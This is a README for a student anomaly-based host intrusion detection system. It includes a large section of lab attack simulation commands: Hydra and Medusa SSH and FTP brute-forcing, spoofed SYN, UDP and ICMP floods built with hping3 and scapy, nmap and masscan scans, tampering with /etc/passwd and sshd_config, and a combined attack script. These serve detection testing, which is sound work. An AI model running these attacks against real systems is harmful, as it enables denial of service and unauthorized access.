# Ulinzi — Host Intrusion Detection System (HIDS)
## CNS 3104 Final Year Project · Strathmore University

> **Lightweight, anomaly-based HIDS for Kali Linux small-network environments.**  
> Detects host-level and network-level attacks in near real-time using adaptive statistical baseline learning.

---

## Quick Start

### Requirements
```bash
pip install -r requirements.txt
# psutil is required for process monitoring
# flask is required for the web dashboard
```

### Run (single command — no second terminal needed)
```bash
sudo python3 app.py
```
Then open **http://localhost:5000** in your browser.

> **sudo is required** so the engine can open a raw `AF_PACKET` socket for network
> capture and read `/var/log/auth.log` for authentication monitoring.

---

## How It Works

### Phase 1 — Baseline Learning (60 seconds)
The engine observes all host monitors for 60 seconds and computes **p95 statistical
peaks** of normal behaviour across every metric. Adaptive thresholds are then set as:

```
threshold = max(hard_floor, p95_peak × 3)
```

Do **not** run attacks during this phase.

### Phase 2 — Detection (continuous, 1-second windows)
Every second the engine evaluates 8 detection rules. An alert fires only when:
- The metric exceeds the computed threshold
- The rule has triggered for `CONFIRM_WINDOWS` consecutive windows (network rules)
- The per-rule cooldown timer (30 s) has elapsed

---

## Alert Levels

| Level    | Colour | Meaning                                      |
|----------|--------|----------------------------------------------|
| INFO     | Grey   | System events (start, stop, mode change)     |
| LOW      | Blue   | Mild anomaly worth watching                  |
| MEDIUM   | Amber  | Suspicious activity — investigate soon       |
| HIGH     | Orange | Likely attack in progress                    |
| CRITICAL | Red    | Severe / confirmed intrusion                 |

---

## Detection Rules

### Host-Level (near-instant — no confirmation window)

| Rule | Name                  | Source                  | Triggers on                              |
|------|-----------------------|-------------------------|------------------------------------------|
| H1   | Brute-force login     | `/var/log/auth.log`     | Abnormal auth-failure rate               |
| H2   | Privilege escalation  | `/var/log/auth.log`     | Abnormal sudo/su event rate              |
| H3   | Process anomaly       | psutil process list     | Abnormal new-process spawn rate          |
| H4   | File integrity        | SHA-256 hash comparison | Any change to monitored critical files   |

**Monitored files:** `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/hosts`,
`/etc/ssh/sshd_config`, `/etc/crontab`

### Network-Level (2-window confirmation)

| Rule | Name       | Triggers on                                          |
|------|------------|------------------------------------------------------|
| N1   | SYN flood  | SYN rate > threshold AND > 60% of TCP packets are SYN|
| N2   | UDP flood  | UDP packet rate > threshold                          |
| N3   | ICMP flood | ICMP packet rate > threshold                         |
| N4   | Port scan  | Single source IP hits ≥ 20 distinct destination ports in 1 s |

---

## Alert Log Format

```
[YYYY-MM-DD HH:MM:SS] LEVEL:<level> RULE:<rule_tag> | <detail>
```

**Examples:**
```
[2026-05-07 14:22:01] LEVEL:CRITICAL RULE:brute_force | failures=47 thr=10 window=1s
[2026-05-07 14:22:05] LEVEL:CRITICAL RULE:syn_flood   | syn=8420/s thr=300 ratio=94% pkts=8420
[2026-05-07 14:22:10] LEVEL:CRITICAL RULE:file_integrity | path=/etc/passwd prev_hash=3a9f1c... new_hash=b72e8d...
[2026-05-07 14:22:15] LEVEL:HIGH     RULE:scan_192.168.1.50 | src=192.168.1.50 ports=512 thr=20
[2026-05-07 14:22:20] LEVEL:HIGH     RULE:priv_escalation   | sudo_su_events=18 thr=5 window=1s
```

---

## Attack Simulation Scripts (Run from Attacker Kali VM)

> Set `TARGET_IP` to the IP address of the machine running Ulinzi.
> All commands below are run **from a separate Kali Linux VM** on the same network.

---

### Setup — set your target IP once
```bash
export TARGET_IP=192.168.1.100    # change to your target machine's IP
```

---

### H1 — Brute-force SSH Login
Triggers: `brute_force` rule, CRITICAL level

```bash
# Fast brute-force with Hydra (rockyou wordlist)
hydra -l root -P /usr/share/wordlists/rockyou.txt \
      ssh://$TARGET_IP -t 8 -f -o hydra_results.txt

# Slower but stealthier — single username multiple passwords
hydra -l admin -P /usr/share/wordlists/metasploit/unix_passwords.txt \
      ssh://$TARGET_IP -t 4

# Brute-force FTP login
hydra -l root -P /usr/share/wordlists/rockyou.txt \
      ftp://$TARGET_IP -t 6

# Brute-force with custom small wordlist (fast test)
echo -e "password\n123456\nadmin\nroot\ntoor\nkali" > /tmp/test_pass.txt
hydra -l root -P /tmp/test_pass.txt ssh://$TARGET_IP -t 4 -V

# Medusa alternative
medusa -h $TARGET_IP -u root -P /usr/share/wordlists/rockyou.txt -M ssh -t 4

# Ncrack alternative
ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt $TARGET_IP
```

---

### H2 — Privilege Escalation (run on TARGET machine itself)
Triggers: `priv_escalation` rule, HIGH/CRITICAL level

```bash
# Rapid sudo commands to spike sudo event rate above threshold
# Run this loop ON the target machine (or via SSH session)
for i in $(seq 1 30); do sudo ls /root 2>/dev/null; done

# Rapid su attempts
for i in $(seq 1 20); do su -c "id" root < /dev/null 2>/dev/null; done

# Both together
for i in $(seq 1 15); do sudo id; su root -c "id" < /dev/null 2>/dev/null; done
```

---

### H3 — Process Anomaly (run on TARGET machine itself)
Triggers: `proc_anomaly` rule, varies by spawn rate

```bash
# Fork bomb (controlled — spawns many short-lived processes)
# WARNING: This will stress the target machine. Use in VM only.
for i in $(seq 1 50); do (sleep 0.1 &); done

# Rapid script execution
for i in $(seq 1 40); do bash -c "echo $i" & done; wait

# Simulate malware that spawns child processes
python3 -c "
import subprocess, time
for i in range(30):
    subprocess.Popen(['echo', str(i)], stdout=subprocess.DEVNULL)
    time.sleep(0.05)
"
```

---

### H4 — File Integrity Violation (run on TARGET machine itself)
Triggers: `file_integrity` rule, CRITICAL level — fires within 5 seconds

```bash
# Tamper with /etc/hosts (most impactful for DNS hijacking simulation)
echo "1.2.3.4  google.com" | sudo tee -a /etc/hosts

# Restore /etc/hosts after test
sudo sed -i '/1.2.3.4/d' /etc/hosts

# Tamper with /etc/crontab (simulate persistence)
echo "# test" | sudo tee -a /etc/crontab
sudo sed -i '/# test/d' /etc/crontab

# Tamper with /etc/passwd (simulate account creation)
# WARNING: Do this ONLY in a VM — restore immediately
echo "hacker:x:1337:1337::/home/hacker:/bin/bash" | sudo tee -a /etc/passwd
sudo sed -i '/hacker/d' /etc/passwd

# Tamper with SSH config
echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config
sudo sed -i '/PermitRootLogin yes/d' /etc/ssh/sshd_config
```

---

### N1 — SYN Flood
Triggers: `syn_flood` rule, level scales with rate

```bash
# Classic SYN flood on port 80
sudo hping3 -S --flood -V -p 80 $TARGET_IP

# SYN flood on port 443
sudo hping3 -S --flood -p 443 $TARGET_IP

# SYN flood with random source IPs (spoofed — simulates DDoS)
sudo hping3 -S --flood -V --rand-source -p 80 $TARGET_IP

# SYN flood with specific rate (500 pkts/sec — gentler test)
sudo hping3 -S -p 80 --faster -c 5000 $TARGET_IP

# Multiple ports SYN flood
for port in 22 80 443 8080 3306; do
    sudo hping3 -S --flood -p $port $TARGET_IP &
done
sleep 10
sudo killall hping3

# Using scapy (Python) — more controllable
python3 - <<'EOF'
from scapy.all import *
import random
target = "192.168.1.100"  # change to TARGET_IP
print("Sending SYN flood for 10 seconds...")
end = time.time() + 10
while time.time() < end:
    pkt = IP(dst=target)/TCP(sport=random.randint(1024,65535), dport=80, flags="S")
    send(pkt, verbose=0)
EOF
```

---

### N2 — UDP Flood
Triggers: `udp_flood` rule, level scales with rate

```bash
# UDP flood on DNS port 53
sudo hping3 --udp --flood -p 53 $TARGET_IP

# UDP flood on port 80
sudo hping3 --udp --flood -p 80 $TARGET_IP

# UDP flood with random source ports
sudo hping3 --udp --flood --rand-source -p 53 $TARGET_IP

# Large UDP packet flood (max payload)
sudo hping3 --udp -p 53 --flood --data 65000 $TARGET_IP

# UDP flood using nmap (slower but cross-platform)
sudo nmap -sU --send-eth -p 53 --min-rate 5000 $TARGET_IP

# Python scapy UDP flood
python3 - <<'EOF'
from scapy.all import *
import random, time
target = "192.168.1.100"   # change to TARGET_IP
print("UDP flood for 10 seconds...")
end = time.time() + 10
while time.time() < end:
    pkt = IP(dst=target)/UDP(sport=random.randint(1024,65535), dport=53)/Raw(b"X"*512)
    send(pkt, verbose=0)
EOF
```

---

### N3 — ICMP Flood
Triggers: `icmp_flood` rule, level scales with rate

```bash
# Classic ICMP flood (ping flood)
sudo hping3 --icmp --flood $TARGET_IP

# ICMP flood with large payload
sudo hping3 --icmp --flood --data 65000 $TARGET_IP

# Standard ping flood (simpler)
sudo ping -f -s 65000 $TARGET_IP

# ICMP flood with random source
sudo hping3 --icmp --flood --rand-source $TARGET_IP

# Using nping
sudo nping --icmp --rate 1000 -c 10000 $TARGET_IP

# Scapy ICMP flood
python3 - <<'EOF'
from scapy.all import *
import time
target = "192.168.1.100"  # change to TARGET_IP
print("ICMP flood for 10 seconds...")
end = time.time() + 10
while time.time() < end:
    send(IP(dst=target)/ICMP()/Raw(b"A"*1400), verbose=0)
EOF
```

---

### N4 — Port Scan
Triggers: `port_scan` rule, MEDIUM/HIGH level

```bash
# Fast SYN scan (stealth scan) — hits many ports quickly
sudo nmap -sS -p 1-1024 --min-rate 500 $TARGET_IP

# Full port scan with aggressive timing
sudo nmap -sS -p- -T4 --min-rate 1000 $TARGET_IP

# UDP port scan
sudo nmap -sU -p 1-500 --min-rate 200 $TARGET_IP

# Comprehensive version scan
sudo nmap -sV -sS -p 1-1000 --min-rate 500 $TARGET_IP

# Xmas tree scan
sudo nmap -sX -p 1-1000 --min-rate 500 $TARGET_IP

# FIN scan
sudo nmap -sF -p 1-1000 --min-rate 500 $TARGET_IP

# Masscan — extremely fast (> 1 million pkts/sec capable)
sudo masscan $TARGET_IP -p 0-65535 --rate 10000

# Unicornscan (alternative)
sudo unicornscan $TARGET_IP:1-65535 -mT -r 500

# Scapy custom scanner
python3 - <<'EOF'
from scapy.all import *
import time
target = "192.168.1.100"  # change to TARGET_IP
print(f"Scanning ports 1-1000 on {target}...")
for port in range(1, 1001):
    pkt = IP(dst=target)/TCP(dport=port, flags="S")
    send(pkt, verbose=0)
print("Scan complete.")
EOF
```

---

### Combined Attack Script (Full Simulation)
Triggers multiple rules in sequence — useful for a comprehensive demo

```bash
#!/bin/bash
# full_attack_sim.sh — Run from attacker Kali VM
# Usage: sudo bash full_attack_sim.sh 192.168.1.100

TARGET=${1:-192.168.1.100}
echo "[*] Ulinzi HIDS Attack Simulation"
echo "[*] Target: $TARGET"
echo ""

echo "[1/5] Port scan..."
sudo nmap -sS -p 1-1000 --min-rate 800 $TARGET -q
sleep 5

echo "[2/5] Brute-force SSH (30 seconds)..."
timeout 30 hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt \
    ssh://$TARGET -t 6 -q 2>/dev/null || true
sleep 5

echo "[3/5] ICMP flood (10 seconds)..."
timeout 10 sudo hping3 --icmp --flood $TARGET 2>/dev/null || true
sleep 3

echo "[4/5] SYN flood (10 seconds)..."
timeout 10 sudo hping3 -S --flood -p 80 $TARGET 2>/dev/null || true
sleep 3

echo "[5/5] UDP flood (10 seconds)..."
timeout 10 sudo hping3 --udp --flood -p 53 $TARGET 2>/dev/null || true

echo ""
echo "[*] Simulation complete. Check Ulinzi dashboard for alerts."
```

Save as `full_attack_sim.sh` on the attacker VM and run:
```bash
chmod +x full_attack_sim.sh
sudo ./full_attack_sim.sh 192.168.1.100
```

---

## Project Structure

```
HIDS/
├── app.py          — Flask web dashboard + engine auto-launcher
├── hids_main.py    — HIDS detection engine (all monitors + rules)
├── requirements.txt
├── README.md
├── alerts.log      — Generated at runtime: all fired alerts
└── hids.log        — Generated at runtime: full operational log
```

## Configuration (top of hids_main.py)

| Parameter            | Default | Description                               |
|----------------------|---------|-------------------------------------------|
| `BASELINE_SECONDS`   | 60      | Baseline learning duration                |
| `WINDOW_SECONDS`     | 1       | Detection window size (1s = fast alerts)  |
| `THRESHOLD_MULTIPLIER` | 3     | p95_peak multiplier for thresholds        |
| `CONFIRM_WINDOWS`    | 2       | Windows before network alert fires        |
| `COOLDOWN_SECS`      | 30      | Minimum seconds between repeated alerts   |
| `FILE_CHECK_INTERVAL`| 5       | Seconds between file integrity polls      |
| `PORT_SCAN_THRESHOLD`| 20      | Distinct ports per IP to trigger scan rule|

## References

- Scarfone, K., & Mell, P. (2007). *Guide to Intrusion Detection and Prevention Systems* (NIST SP 800-94).
- Roesch, M. (1999). *Snort: Lightweight Intrusion Detection for Networks.* USENIX LISA '99.
- Behl, A., & Behl, K. (2017). *Cybersecurity and Cyberwar.* Oxford University Press.
